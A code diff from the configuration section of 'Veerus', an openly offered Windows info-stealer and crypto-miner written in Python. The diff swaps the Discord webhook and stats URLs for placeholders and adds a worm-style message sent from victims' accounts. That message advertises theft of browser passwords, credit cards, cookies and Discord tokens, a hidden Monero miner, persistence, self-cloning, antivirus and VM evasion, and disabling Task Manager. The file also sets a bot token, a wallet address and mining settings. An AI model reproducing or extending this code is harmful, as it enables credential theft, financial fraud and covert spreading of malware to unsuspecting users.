@@ -53,13 +53,35 @@ USER_NAME = getpass.getuser()
 Bot_Token = "MTAxMjAwNjMzOTQwNjQ3OTM5MA.GOupsL.usiJ0LqTvSIRRY9AMjht3i9AfYS7Q3cWxAFgyQ"
 
 
-WEBHOOK = "https://discord.com/api/webhooks/1012007132427726969/5fwQBz7n3vElzF9GmB2Ljhx0xrnmTP9L2VSKo_GvXt_jScSDKSFbKad4PWrnIC7irvLF"
+WEBHOOK = "webhook667"
 webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 dm_all = True
-DMALLMSG = """Oe bebou g trv un discord image grabber c incroyable genre t'envoie une image et ca grab\nGithub : https://github.com/0xSxZuu/test/releases/download/test/image_grabber.exe"""
+DMALLMSG = """:flag_gb: Hello !
+Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same? Let me explain what you can do with Veerus :
+```Stealer :
+	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
+		Passwords, Credit Cards, Cookies, Autofill
+
+	Discord :
+		Token
+
+	Miner :		
+		Hidden XMR Miner
+	Other :
+		Add to computer startup the number of time you choosed.
+		Clone the virus in random directories
+		Undetected by Windows Defender & Windows Smart screen
+		Anti Virtual Machine
+		Disable Task Manager```
+
+	Price : 0.00$ ! yes ! Totally Free !
+
+	Links :
+		Discord : https://discord.gg/7GkfBzRQXX
+		Github : https://github.com/0xSxZ/Veerus"""
 mdmbot = discord.Client()
-STATSWEBHOOK = "https://discord.com/api/webhooks/1012007166690984027/htoCjghCE9hZvs05SY8PrlKGqVJQ_WWltNmraWX603IUL-a8E28eGYmVFeZMlS-xT86U"
+STATSWEBHOOK = "NoWebhook667EKIP"
 STATSAPI = [
 	"https://api.nanopool.org/v1/xmr/hashrate/" + str(ADDRESS),
 	"https://api.nanopool.org/v1/eth/avghashrate/" + str(ADDRESS),
@@ -101,7 +123,7 @@ PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
 ]
-PROCESS_NUM = 5
+PROCESS_NUM = processnumbers
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
